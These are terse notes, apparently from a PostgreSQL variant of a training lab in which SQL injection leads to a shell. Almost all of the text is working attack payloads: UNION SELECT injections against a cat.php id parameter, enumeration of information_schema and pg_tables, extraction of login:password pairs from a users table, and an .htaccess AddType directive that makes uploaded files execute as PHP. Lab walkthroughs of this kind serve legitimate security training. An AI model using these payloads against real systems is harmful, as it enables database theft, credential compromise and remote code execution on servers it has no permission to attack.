Same as FromSQLiToShell but PostgreSQL not MySQL

`/cat.php?id=1 UNION SELECT null,null,null,null`

`/cat.php?id=1 UNION SELECT 1,'a','b',2`

version(), current\_user, current\_database()

`column_name FROM information_schema.columns`

`tablename FROM pg_tables`

concat in PG with ||

`UNION SELECT null,table_name||':'||column_name,null,null FROM information_schema.columns ORDER BY 2`

`UNION SELECT null,login||':'||password,null,null FROM users`

We can upload non-php-extension files but we can't run them unless we register a new type in .htaccess (because AllowOverride is set to all)

`AddType application/x-httpd-php .doot`
